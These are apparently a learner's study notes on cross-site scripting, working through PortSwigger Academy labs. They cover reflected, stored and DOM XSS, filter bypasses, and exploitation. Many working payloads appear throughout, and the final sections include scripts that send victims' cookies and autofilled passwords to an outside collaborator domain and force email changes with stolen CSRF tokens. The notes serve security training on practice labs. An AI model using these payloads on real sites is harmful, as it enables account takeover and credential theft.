### Types of XSS

1. **Reflected XSS** – Script is reflected from the HTTP request.
    - Example:
        
        ```
        https://insecure-site.com/status?message=<script>Bad</script>
        
        ```
        
2. **Stored XSS** – Malicious data is stored (e.g., comments, chat messages) and later displayed unsafely.
3. **DOM-based XSS** – Vulnerability exists in client-side JS, e.g.:
    
    ```jsx
    results.innerHTML = "You searched for: " + search;
    
    ```
    
    - Attack example:
        
        ```
        <img src=1 onerror='Bad()'>
        
        ```
        

### Impact of Reflected XSS

- If an attacker controls a script executed in the victim’s browser, they can:
    - Perform any action the victim can perform.
    - View or modify any data the victim can access.
    - Interact with other users (e.g., launch further attacks).
- Delivery mechanisms:
    - Malicious links on attacker-controlled or third-party websites.
    - Links sent via email, social media, or messages.
    - Can target specific users or be broad attacks.
- **Generally less severe** than stored XSS because it requires an **external delivery mechanism**.

Testing for Reflected XSS

- **Test all entry points** – Query strings, message bodies, URL paths, and headers.
- **Submit random alphanumeric values** – Use ~8-character random strings to detect reflections.
- **Locate reflections** – Check responses for the submitted value.
- **Determine context** – Identify where in the HTML or JS the value appears (e.g., inside tags, attributes, or JavaScript).
- **Test candidate payloads** – Insert payloads into requests (e.g., via Burp Repeater) to see if they execute.
- **Try alternative payloads** – Adjust based on context or input filtering.
- **Verify in a browser** – Use a simple test like `alert(document.domain)` to confirm execution.

### Impact of Stored XSS

- Same capabilities as reflected XSS:
    - Perform victim’s actions.
    - View or modify victim’s data.
    - Launch further attacks on other users.
- **Key difference**: Stored XSS is **self-contained** within the application.
    - No external delivery needed.
    - Guarantees execution when users encounter it—especially effective against logged-in users.

3)

1. Enter a random alphanumeric string into the search box.
2. Right-click and inspect the element, and observe that your random string has been placed inside an `img src` attribute.
3. Break out of the `img` attribute by searching for:`"><svg onload=alert(1)>`

### **How to Test for DOM XSS**

1. **Use Developer Tools (e.g., Chrome DevTools):**
    - Open the Console and Elements panels.
    - Put a unique string (like `xss123`) in a source (`?q=xss123`) and search the live DOM (`Ctrl+F`) for where it appears.
    - Remember: **View Source won’t work**—DOM XSS occurs **after** the page loads.
2. **Inspect Sinks:**
    - If your string is inside an HTML attribute, try breaking out:
        
        `?q=" onmouseover=alert(1) x="`
        
    - If it’s inside a script context, test code execution:
        
        `?q=';alert(1)//`
        
3. **JavaScript Debugger Method:**
    - Search the page’s scripts (`Ctrl+Shift+F`) for sources like `location.search`.
    - Set breakpoints to track where values flow.
    - Follow variables until they reach a sink.

**`document.write()`** is often targeted in **DOM-based XSS** because it directly writes content into the page’s DOM. If attacker-controlled input is passed to `document.write()` without proper sanitization, malicious JavaScript can execute.

**DOM XSS combined with reflected and stored data:
Pure DOM XSS:** happens when all actions happen in the same client side like when a script reads some data from the URL and writes it to a dangerous sink, then the vulnerability is entirely client-side, when the javascript reads the link for example location.hash and no echo happens

Reflected XSS (classic): the data comes with the request (the query output you just asked for) for example an alert
Reflected DOM XSS (hybrid): and this is the main topic now, this happens when the server processes data from the request, and echoes the data into the response so here's actually both things happened the data worked with the javascript (for example parsing or eval )and then got reflected in an unsafe way

`eval()` is a built-in JavaScript function that takes a string argument and **parses + executes that string as JavaScript code** at runtime.

example:

```python
eval("2 + 2");           // returns 4
let x = 1;
eval("x = x + 5");       // changes x to 6
```

### Why it's dangerous

- **Code injection**: If any part of the evaluated string can be controlled by an attacker (URL, form input, server-reflected data), they can run arbitrary code in your page.

so now let's solve **Reflected DOM XSS lab**

1)went to search functionality and sent a request to search “test” for example 

2)right click then went to inspect then resources to check the js file and how it works 

find out it uses eval to execute the search 

 `eval('var searchResultsObj = ' + this.responseText);`

which is kinda sus cuz eval function is not that safe as we said 

3)went to proxy and intercept the search request find the response is a json type looks like this 

```python
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 33

{
"results":[],
"searchTerm":"test"
}
```

4)tried to break that string to execute javascript query so i used `test" - alert(1)`

found out it skips the “ i just put and the response looks like `test\" - alert(1)` backslash skips the character so it doesn't really see the “ i put to break the string 

5)since the website puts a \ before the “ to skip it automatically, what if i try to skip that backslash the website adds so that instead of making it skips my “ his backslash gets skipped by mine 

6)used this as the new search input`test\" - alert(1)`

the response now looks like 

```python
{
"results":[],
"searchTerm":"test\\" -alert(1)"}
```

which means it worked 

but why doesn't it execute? cuz we still have that part `"}` after the alert so we need to comment that part out 

7)to add a comment in javescript you should use 2 forward slashes like c++ and many other languages and then we need to close that tag using a curly brackets }

8)so now our final input is `test\\" -alert(1)}//` 
put it in the input and watch the alert shows on ur screen

so from this lab you know that eval is not safe to use developers can use other functions like JSON.parse for example

now lets talk about **Stored DOM XSS:**

it happens when a server process the data into javascript function and then saves the data input and use it to show it in a response in another page using unsafe sink example

```python
element.innerHTML = comment.author
```

Why `element.innerHTML = comment.author` is dangerous?

If `comment.author` contains attacker-controlled HTML/JS (e.g. `"<img src=x onerror=alert(1)>"`), then assigning it to `innerHTML` will cause the browser to parse and execute that markup. **The problem is the sink (`innerHTML`) — it treats the string as HTML, not plain text.**

now lets solve **Stored DOM XSS lab**

1)went to the comment section right click then inspect then resources to check the js code 

2)i found out it uses this function to escape the tags

```python
  function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }

```

so it’s basically replaces ure tags with encoded value to not execute it 

3)so let's try normal html injection to see how the website reacts to it 

```jsx
`<h1>test</h1>` 

the comment got saved and only the first tag got printed giving us an output like <h1>test that means that the first part only got encoded but the other tags went to be processed with the dom it actually worked
so one thing you need to know 
````
**html.replace** only works one time so it replaces the first < tag and the first > tag it sees and doesn't replace any of the others comes next 
4)so what if we put dummy tags first to be replaces and then inject our real payload tags

4)so applying on what we have said i made this payload 
```jsx 
`<> <s onmouseover =alert(1)>"xss"</s>`  
````
what it does : first we put the two fake tags to make then get encoded then i uses a
```jsx
"<s>"
```
tag that strikes the words xss out and put event attributes onmouseover that says once the mouse comes over the xss word fire the code alert (1) 

5)tried it and it works but the lab needs a specific payload to get solved  so i used `<><img src=1 onerror=alert(1)>`

so in this lab we know that using .replace function is not so smart cuz it only escapes one time so it can be manipulated easily 

so what else function that if u saw you can guess that the website in vuln for DOM XSS 

## **Which sinks can lead to DOM-XSS vulnerabilities?**

The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:

```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

now we will talk more in depth about
**XSS between HTML tags:**
the goal of the module is to fully understand how xss work into the html not just copying payloads and pasting it 

- **🏷️ Tags:** These are your **"delivery vehicles"**. You inject tags like `<svg>`, `<img>`, or `<script>` to create an element that the browser will process. The goal is to get a tag past the website's filter.
- **⚙️ Attributes:** These are the **"tools"** you use to set up the attack.
    - Sometimes the attribute *is* the attack (e.g., `href="javascript:alert(1)"`).
    - More often, you use an attribute to create a *condition* (e.g., `href="invalid-path"` on an `<image>` tag).
- **⚡ Events:** This is your **"trigger"**. The event handler (like `onerror`, `onload`, `onmouseover`) is the most common place to put your malicious JavaScript. It waits for the "condition" you set up with your attributes (like the `href` failing to load) and then executes your payload.

so first thing to know is how the html tag works 
for example if you have input that gets shown inside a tag like the 

`<h1> ‘test’ </h1>` 

here you need to know that 

-inside the  `<h1>` tag you can add another tag 

-or you can first close that tag with </h1> in the input and the add the other tag you will fire the alert in

-the tags u added breaks out and create a new tag on its own automatically or sometimes you need to close the other tag urself before starting the new one

lets solve first two labs:

Reflected XSS into HTML context with nothing encoded
Stored XSS into HTML context with nothing encoded

1)these two labs has the same idea you can put tags inside the tags they have in the website with no restrictions 

2)first one you go to search bar find out it saves the search value inside `<h1>` tag and as w said you can insert another tag inside those tags so simply insert `<img src=0 onerror=alert(1)>` and it will get saved inside the h1 tag and it will work fine and fire the alert

second lab

1)same idea but it's stored so your xss has to get saved in the server so go to comment section and find out the content on you comment gets saved inside <p> tag 

briefly those tags can hold another img tag inside em and work fine 

2)insert <img src=0 onerror=alert(1)> inside the comment  content and it will get saved and fire the alert each time you visit it

not in all cases it will be that easy or all tags will be allowed if there's a WAF

lets solve the third lab

**Reflected XSS into HTML context with most tags and attributes blocked:
1)**first i tried to put “test” in search bar and noticed it get reflected into h1 tags so lets try to inject other tags inside those tags
2)tried <img> tags doesn't work <svg> doesn't work either so now we know there's a WAF filters the tags you put 

3)i took the GET request of searching sent it to intruder and added <> to search bar while adding the part inside to the target so i looks like this

```python
GET /?search=<$$> HTTP/2
Host: 0aab0093035bb5df807c8ae400820080.web-security-academy.net
Cookie: session=N6dFc3yX0NyLeZ53f9FTaS0ALJYMORs8
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aab0093035bb5df807c8ae400820080.web-security-academy.net/?search=%5Ba%5D%28javascript%3Aprompt%281%29%29
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

and went to cheat sheet and copied all the tags to fuzz out what tag will bypass the waf then click attack

4)found out it accepts the <body> tags now lets try attributes tried onmouseover/onerror and didn't, the WAF filters this too 
5)sent the request again but not to fuzz out the attribute 

it look like 

```python
GET /?search=<body $$=1> HTTP/2
Host: 0aab0093035bb5df807c8ae400820080.web-security-academy.net
Cookie: session=N6dFc3yX0NyLeZ53f9FTaS0ALJYMORs8
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aab0093035bb5df807c8ae400820080.web-security-academy.net/?search=%5Ba%5D%28javascript%3Aprompt%281%29%29
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

pasted all the attributes in the payloads and click attack 

6)found out more than one attribute works like onresize/onscrollend

so we will use the onresize attribute now our payload looks like 

`<body onresize=print(1)>` but it into the search bar the click ctrl+ or ctrl- and the alert will fire now we made sure it works lets send it to the victim

7)we need to host a page that redirects the user to the search page and then put that payload in search and then resize the screen for him so that the print fires 

so we will go to the exploit server and use this code

```python
<iframe src="https://0aab0093035bb5df807c8ae400820080.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

so this iframe page uses src=<link of the lab with the search payload in the url> and the onload attribute used to resize the page for the victim 

click store then send to victim and watch urself getting the lab solved 

lets solve the fourth lab 
**Reflected XSS into HTML context with all tags blocked except custom ones:**
1)first i tried to fuzz the tags that bypass the WAF so i found only the custom tags work

Custom tags in HTML are **non-standard elements** that *you invent yourself*, like:

```html
<hello>
   this is a custom tag
</hello>
```

Browsers **don’t break** when they see unknown tags — they simply treat them as **inline elements with no behavior**.

2)so lets creat out custom tag we will first use 

<xss onmouseover=alert(1)>test</xss>

and now once you get your mouse over the text it fires an alert but we need to make the attack more automated 

3)so in order to make it more automated

-we will use onfocus event

 

-then make an id for that tag by using id=’x’ so that we can call it to focus on the tag so the alert fires 

-and in order to do that we will need to use tabindex=”1” so that the tag can be focusable so our payload will look like :

`<xss onfocus=alert(1) id='x' tabindex="1">` 

we will put that in the search bar then add #x at the end of the url to give it the id of the tag i want to get focused

so our final url will look like

```python
https://0ab700a1041b77b1820616c5007e00b2.web-security-academy.net/?search=%3Cxss+onfocus%3Dalert%281%29+id%3D%27x%27+tabindex%3D%221%22%3E#x
```

so now we need to host a page and this page redirect the victim to the search page and exploit the vulnerability 

so go to exploit server and put 

```python
<script>
location= "https://0ab700a1041b77b1820616c5007e00b2.web-security-academy.net/?search=%3Cxss+onfocus%3Dalert%28document.cookie%29+id%3D%27x%27+tabindex%3D%221%22%3E#x"
</script>
```

simple script tags redirect the victim to the url but using document.cookie instead of alert(1) in order to solve the lab

now let's solve 
**Lab: Reflected XSS with event handlers and `href` attributes blocked:**
1)first i tried normal <img> tags says not allowed so i went to intruder with my cheat sheet to see what tags i can use like other labs

2)found <a> tags are allowed and also <animate>

so in normal conditions I'd say “excellent <a> tags are allowed i can use `<a onclick= “alert(1)”>click me</a>` or `<a href= “javascript : alert(1)”>click me</a>`”

but guess what, both of them are blocked since all *anchor*  events and href are blocked

3)so we need to think in another way so searched about <animate> tags to know they are svg elements used to animate attributes of other SVG elements (like color, position, opacity, etc.).

and in normal you can use <animate> as 

```python
<svg>
  <text x="10" y="20">Click</text>
  <animate attributeName="x" begin="click" onbegin="alert(1)"/>
</svg>

```

this means once clicked on the work “click” fire the alert
but guess what, the event onbegin is not allowed too 
so now we need to make use of both tags together to get the final result

4)so once the WAF sees the href attribute inside the <a> tags it gets blocked and once it sees any event inside the animate it also blocks it, so now we will use the animate tags to hold the value of the href (the waf will not treat it as an attribute anymore) and then use the <a> tags to execute the value inside the animate tags

and our final payload will look like :

```python
<svg>
<a>
<text x=20 y=20>Click me</text>
<animate attributeName=href values=javascript:alert(1) />
</a>
</svg>

```

so now 
-we use an <svg> tag 
-and inside it we use the <a> tag the link tag 
-inside that link tag we use <text> tag to draw the work “clickme”
-and inside that link tag we put the attribute of the href and it's value →`javascript:alert(1)` using the animate tags

-so at the end after it fires the <a> tags will only see `href=javascript: alert(1)` and fire the alert
so 

### Why it bypasses everything:

- No `href=` inside `<a>` → the filter sees nothing dangerous
- No event handlers → nothing blocked
- Javascript URL stored in `values=` doesn’t trigger filter
- SVG animation engine moves it into `<a>` after parsing

now let's solve
**Reflected XSS with some SVG markup allowed:**
1)first thing i need to know what tags are allowed so use intruder and cheat sheet to get allowed tags <svg> <image> <animatetransform> <title> are allowed

2)now i want to test what events are allowed
send the search request to intruder

and use 

```python
GET /?search=<svg> <image $target here$ > </svg> HTTP/1.1
```

dont forget to `URL` encode it 

3)found onbegin event is allowed

after a little search found that onbegin work with **animation elements** (like `<animate>`, `<set>`, or `<animateTransform>`), not for graphic elements like `<image>` 

so good thing we has `<animatetrasform>`
so now we will use it as 

`<svg> <animatetransform onbegin=alert(1)> </svg>`

put it and click search and the lab is successfully solved

**XSS in HTML tag attributes**

sometimes when then when the content is inside html tag you close that tag and then add a new tag you made

for example 

`">`<script>alert(document.domain)</script>

the `">` used to close the first tag and then you open script tag

but sometimes the brackets are encoded by the website so in this situation you can just add the xss as an attribute inside the tag for example:

`"` autofocus onfocus=alert(document.domain) x=”

here you just added an attribute inside the tag that executes an alert

time to solve 
**Lab: Reflected XSS into attribute with angle brackets HTML-encoded**
1)put a test word in the search bar and check the page source you will find it in two places

place1: `<h1>0 search results for '&quottest'</h1>` → this is an h1 tags and everything gets encoded in it brackets and quotes too so it's not vuln till now

place2: `<input type=text placeholder='Search the blog...' name=search value=""test">`→ this is input tag and it's more interesting now since it doesn't encode quotes even tho it still encode brackets 

2)so as we explained we will be more interested in the second place and we will try to inject an event handler after closing that`value` attribute 

so we will this payload `“  autofocus onfocus="alert(1)` 

the quote is to close the value attribute and then autofocus (a Boolean attribute to focus the element) and the onfocus (event handler to fire the alert)

so it will look at the end as:
`<input type=text placeholder='Search the blog...' name=search value="" autofocus onfocus="alert(1)">`

sometimes the website uses the user input inside dangerous tags that can be used in a bad way

for example: letting the user input inside <a> tags with no enough restrictions 

lets solve  **Stored XSS into anchor `href` attribute with double quotes HTML-encoded:** 

1)first go to a comment section and fill every feild “dont forget to fill the website feild too cuz without it you will not have clickable name”

2)go to page source and see how it treats your inputs and it looks like this

```python

<a id="author" href="https://test.com">test</a>

```

-first you try to break out of tags and try quotes and brackets but both are encoded so no use

3)then you try to think how the <a> tags actually work 
first you give it the action in the href attribute and between the opening and the closing tags you put the text

and this exactly what the website does you just give it the link and he puts it for you inside the href and then you give it your name and it put it between the tags

so

4)instead of a link you give it JavaScript action cuz you can execute JavaScript using href attributes 

and you can put click me instead of your name and now you have a clickable btn that fires an alert and it looks like this in the webpage: 

```
<a id="author" href="javascript: alert()">click me</a>
```

### **Attribute Injection using Access Keys**

Sometimes you will find yourself inside a tag where angle brackets `< >` are encoded (so you can't break out), and the tag itself is "passive" or invisible (like `<link>` or `<input type="hidden">`).

**The Problem:**
Standard events won't work here.

- `onmouseover`? No, because the element is invisible (hidden input) or in the `<head>` (link tag), so you can't hover over it.
- `onfocus`? No, because you can't tab into a hidden field.

**The Solution:**
We use the **`accesskey`** attribute.
This attribute allows you to assign a specific letter to an element (e.g., `accesskey="x"`). When the user presses a specific key combination (Shortcuts), the browser simulates a "click" on that element, causing the `onclick` event to fire even if the element is hidden.

**Shortcuts:**

- **Windows:** `ALT` + `SHIFT` + `X`
- **Mac:** `CTRL` + `ALT` + `X`

also found that this same technique works on `<input type="hidden">` fields.

1. **Scenario:** You find reflection inside a hidden input:
`<input type="hidden" name="redacted" value="USER_INPUT" />`
2. **Challenge:** You can't see the input, so you can't click it, and `autofocus` won't work because hidden fields can't accept focus.
3. **Exploit:** Inject the access key.
`" accesskey="X" onclick="alert(1)`
4. **Result:** When the key combo is pressed, the browser "activates" the hidden input and the `onclick` event fires.

so let's solve **Lab: Reflected XSS in canonical link tag:
1)**first view page source and found   `<link rel="canonical" href='https://0a1700fc0391cf158425150c00fc008e.web security-academy.net'/>` 

that holds the URL value

2)so first ill make a query string inside the url by adding **`/?test`**  and check it's reflected in the page source 

3)the add ‘ to get out of the url href and check the source code to see u braked out of the url 

4)now inject the payload 

```python
**/?'accesskey='x'onclick='alert(1)**

```

notice i lift the last quote cuz the source code page shows that it already has the end quote we just broke out from

now the lab will be solved and if it's sent to a victim they have to press `ALT` + `SHIFT` + `X` for example to make the alert fire

now lets talk about

**XSS into JavaScript**

so there's many scenarios of writing inside script tags but one of the easiest is 
to first close the tags </script> with a script closing tag and then put in ur html code for example `<img src=0 onerror=alert(1)>`

the website first looks for the tags to know which part is js and which part is html then it starts to understand the functionalities 

lets solve now
**Reflected XSS into a JavaScript string with single quote and backslash escaped**

1)first i went to the search section and injected <’test 

just to check if it encodes it and where does it get reflected 

2)found my input gets reflected in two places

1st place:
  `<h1>0 search results for '&lt;&apos;test'</h1>`

my input gets encoded and it's inside h1 tags

2nd place

```python
 <script>
 var searchTerms = '<\'test';
</script>

```

gets reflected inside script tags and doesn't get encoded so  this looks more interesting to me 

so even tho the `‘` and `\` doesn't get encoded it gets escaped by the website and you can see that by inspection into the dom so if they don't get escaped you could simply concatonate your alert to the script by using `’ + alert(1)`

another solution you can use is adding a backslash into the payload so that it escapes the website backslash so it will look like `\’ + alert(1)`

3)first closed the script tags and the injected my malicious html tag 

`</script> <img src=0 onerror=alert(1)>` 

or you can close those tags and open a new one with just the alert

`</script><script>alert(1)</script>`

now let's solve the second lab

**Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded**

1)same as the last one went and put <’ test in the search to see where it gets reflected and what gets encoded

2)found it in two places one gets encoded and inside javascript and it doesn't get encoded or escaped 

3)so now the js code looks like

```python
 <script>
var searchTerms = 'test';
</script>
```

so to be able to execute a js code i need to break out of the variable searchterms and then execute my code 

in order to do that ill put 

`‘;alert(1)` but it didn't work cuz theres still leftovers from the page code so i put // to comment the rest of the code so my final payload is 
`’;alert(1)//`

4)put it into search bar and hit enter and the lab is solved

sometimes the developers try to play smart and escape your quotes with backslash

backslashes(/): they are used in JavaScript to tell the parser that the following letter take it as a normal character not a special character (don't get it involved with the code pls)

so you can be a little more smart than them and add a backslash before the quote so ur backslash work as a escaper for their backslash

**Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**

1)went to the search injected <’test to see what gets encoded and where it gets reflected

2)found the script encodes the brackets and escapes the quotes

3)since it encodes brackets i cant break out of the script

but i can try the escaping trick 

```python
<script>
var searchTerms = 'test';
</script>
```

first i closed the var serachterms parameter with quote and simi colon then put my alert and commented the rest **of the line**

`‘; alert(1) //`

4)then i added a backslash before the quote to do `escaping the escape`trick, to escape the website backslash

so final payload is ?

`/’; alert(1) //`

additional information: you can use + to concatenate the alert and sometimes - in case the plus gets encoded

and you will not have to breakout of the var parameter

for example if it looks like 

`var input = 'USER_INPUT';`

your payload will be

 `' + alert(1) + ‘` 

so it will look like 
`var input = '' + alert(1) + '';`

another question i had in mind was what if the js code is in one line like 

```python
<script>var x = '\\'; alert(1)//'; ... </script>
```

so after you comment the rest of the code the closing tag will be commented to so will it work?

the answer is yes

**Why? Because the HTML Parser runs first.**

1. **HTML Parser Priority:** The browser's HTML parser scans the document first to identify tags. It looks for `</script>` to know where the script block ends. It **does not understand JavaScript**. It doesn't know what `//` means. It just sees `</script>` and says, "Okay, the script block ends here."
2. **JavaScript Engine:** After the HTML parser extracts the content of the script block, it hands it over to the JavaScript engine. The JS engine executes the code.

So, effectively:

- The **HTML parser** forces the script block to close the moment it sees `</script>`, ignoring the comment.
- The **JS engine** executes the alert, sees the `//`, and ignores everything else *inside that specific block*.

so `//` only comments out the text until the next line break, or until the HTML parser forces the script block to close

now let's make a **scenario** where you need to fire an alert without using  parentheses `()` or semicolons `;` or quotes `'`

duo to encoding or escaping or whatever, you have more than one solution:

### 1. The Core Trick: `throw` and `onerror`

Normally, you call a function like this: `alert(1)`.
But if `()` is blocked, you can use the browser's error handling system.

- **How it works:** You tell the browser, "If an error happens, run this function" (`onerror=alert`). Then, you deliberately cause an error and send data with it (`throw 1337`).
- **The Code:** `<script>onerror=alert;throw 1337</script>`
- **The Result:** The browser catches the error `1337` and sends it to `alert`. You see an alert box saying "Uncaught 1337".

### 2. Bypassing the Semicolon `;`

The previous example used a `;` to separate the setup from the throw. If semicolons are blocked, you have two options:

- **Option A (Curly Braces):** You put the setup inside `{ }`. This counts as a "block," so you don't need a semicolon after it.
    - Code: `<script>{onerror=alert}throw 1337</script>`
- **Option B (Inside the Throw):** The `throw` command calculates everything to its right before throwing. You can assign the error handler *inside* the throw statement.
    - Code: `<script>throw onerror=alert,'some string'</script>`
    - Logic: It sets `onerror` to `alert`, then throws the string.

### 3. The "Uncaught" Problem (Chrome)

When you `throw 'Hello'`, Chrome doesn't just send `'Hello'` to the function. It sends `'Uncaught Hello'`.
If your target function is `eval`, this breaks everything because `eval('Uncaught Hello')` is not valid code.

- **The Fix:** You add an equals sign `=` at the start of your payload.
- **Payload:** `throw '=alert(1)'`
- **What Chrome sees:** `Uncaught=alert(1)`
- **Why it works:** `eval` reads this as "Create a variable named `Uncaught` and assign `alert(1)` to it." This executes the alert!

### 4. The Firefox Problem

Firefox is annoying. Instead of just "Uncaught", it prefixes the error with `"uncaught exception"`.

- `eval('uncaught exception = alert(1)')` fails because variable names cannot have spaces in them.
- **The Fix (Fake Error Object):** Instead of throwing a string, you throw a specific **Object** that looks like a real browser error (containing `lineNumber`, `fileName`, etc.).
- **Why it works:** When Firefox sees an object with these specific properties, it assumes it is a real system error and **does not** add the text "uncaught exception". This allows the payload to pass through to `eval` cleanly.

### 5. The "Pepe Vila" Trick (No `throw` needed)

Finally, the text mentions a method by **Pepe Vila** that doesn't even use the word `throw`.

- **How it works:** It deliberately causes a **Type Error** (like trying to use a number as a function).
- **The Logic:** The browser automatically generates an error string when the Type Error happens, and if you have set up `onerror` correctly beforehand, it triggers your code automatically.

now let's solve 
**Lab: Reflected XSS in a JavaScript URL with some characters blocked:**

```python

```

**Making use of HTML-encoding:**

sometimes we can make a good use of HTML-encoding 

lets first learn about how the website renders your page

1)first the server security or WAF checks for the blacklisted characters and tell the server to not treat it as special characters 

2)then after making all malicious characters as normal characters the `HTML Parsing & Decoding` takes place to understand all the HTML entities and the code

3)then it passes the code to the `js execution`

so after knowing this order 

we can now use a new methode is to user quotes and the blacklisted chars that the WAF blocks into HTML encoding so that it can bypass the WAF or the server security but once reached to the HTML Parsing & Decoding the webiste can understand it and treat it as special characters 

now lets apply on that:

**Lab: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**

1)first went to comment section and posted a comment and went to see page source 

```python
 <a id="author" href="http://foo&apos;-alert(1)-&apos;" onclick="var tracker={track(){}};tracker.track('http://test.com');">eee</a> | 22 November 2025

```

here im only interested in that part `onclick="var tracker={track(){}};tracker.track('http://test.com');"`

as you can notice you can control the url place that lies into an onclick event, means we can run js inside it 

2)now we will try to concatenate our alert to the http link you provide so the server sees smth like 

oh please on click visit that link 

and also fire an alert for me 

so in order to do that it will look like 

so our input inside the link parmater should be like 

`https://test.com’+alert(1)+’`

but after you put it you found out that website escapes those quotes and `the escaping the escape` trick does not work on it

3)so in order to inject that you will have to HTML encode your quotes and it will work so now your input will look smth like 
`http://test.com&apos;+alert(1)+&apos;`

you can also use a minus instead of the + and it will work 
`http://test.com&apos;-alert(1)-&apos;`

**XSS in JavaScript template literals**

it's a type of javascript syntax that you can user to execute commands in variables 
and it works when the value of the variable is into backticks (``) → ``${...}``

so if the code looks like this 

```python
<script>
...
var input = `controllable data here`;
...
</script>

```

you can use ur command inside ${command}
and since the value has backticks it should be executed 
so it will look like 

```python
<script>
...
var input = `${alert(document.domain)}
`;
...
</script>

```

now lets solve : 
**Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped:
1**) went to the search section searched for test
2)clicked to view page source and found it looks like 

```python
 <script>
var message = `2 search results for 'test'`;
</script>
```

so i found it has the input inside backticks 

3)to verify the vulnerability i searched for `${1+1}` 

and it gave me 2 means i can execute commands here 

4)so i searched for `${alert(1)}` and it fired the alert

# **Exploiting cross-site scripting vulnerabilities**

creating the popup alert() doesn't mean this is all what xss can do, this simply proofs that you can execute JavaScript on the domain

now let's see how far can xss go in different scenarios

### **Exploiting cross-site scripting to steal cookies**

stealing cookies using xss is so common, you can steal victim cookies and send it to your domain and then inject it to gain access to his account

there's some limitation

1)victim might not be logged in (so that he doesn't have a valid cookie yet)

2)many websites use HttpOnly flag which blocks cookies from javascript 

3)session might be tied to smth else so even if you steal it you can't inject it in ur browser

4)session might expire before you use it 

okay so now lets solve 
**Exploiting cross-site scripting to steal cookies**
1)first went to comment section found it has stored xss by injecting simple <script> alert(1) </script>

2)now i need to change the alert section with a command that sends the session of the victim to my domain (like webhook or collaborator)

so simply ill use fetch function 

### **fetch API** :

is a js function that sends GET requests by default but you can use method option to change the request method and it gives you a **promise** that it will let you know the response once it gets it 

so now all i want to do is to use this function to force the victim to send a GET req to my domain but ill attach his cookie as a query URL parameter 

so it will look like 

```python
<script>
fetch(”https://[yxzm5hb5lbivrexm5gra9lqbb2hu5ytn.oastify.com](http://yxzm5hb5lbivrexm5gra9lqbb2hu5ytn.oastify.com/)?parameter=" + document.cookie);
</script>
```

3)then go back to collaborate click pull now get the session and inject it into your browser

here's the portswigger script solution 

```python
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

as we can see it changes the request method into **POST** request so it basically makes the victim send a post req with his session to the attacker domain

and it has the **no-cors** part: this is an important part and it made to bypass Same-Origin policy cuz it says “Send this request, but I don't need to read the response” so since you aren't trying to bring data *into* the page—you're just throwing data *out,* it will let you pass

## **Exploiting cross-site scripting to capture passwords**

sometimes you can't get the cookie from the user using js duo to HttpOnly flag or whatever

but you still can use another way to get credentials of the victim if you got xss

you can simply make a fake username and password form in that infected place and if the victim has auto filler authenticator it will fill this form with his data and then you can take this credentials this way

now apply on this 

1)first got the infected place

2)then injected this js code let’s examine it 

```python
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

so this code simply makes html form with 2 inputs

username

password

and then it checks if the password field got value inside it

it depends on how the auto authenticator works cuz once it sees a form with those field names it fills it with data and once this data is filled it gets sent using fetch function as a post method with this data the username and the password

and since we used onchange event handler so once these fields null value changed they get sent

3)go to collaborator and get the credentials of the administrator

## **Exploiting cross-site scripting to bypass CSRF protections**

so xss allows attacker to do mostly anything on the victim browser by using javascript and one of the things you can do is to make the victim send a request to the server by his CSRF token to change his password or his email 

so lets apply on that in the next lab

1)first login to your account to see the functions and the req you can send as normal user  

2) you found that you can change your email by a post request that has two parameters the email (the new email you changing to) and the csrf token

3)so after you found this stored xss in the comment section we will try to force the user using javascript to preform changing email by his own csrf token

we will use this code

```python
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

`XMLHttpRequest` is as same as `fetch` used to send requests but fetch is better as it doesn't have callback hall and easier to use and more stealth

so let's make the fetch version out of it 

```python
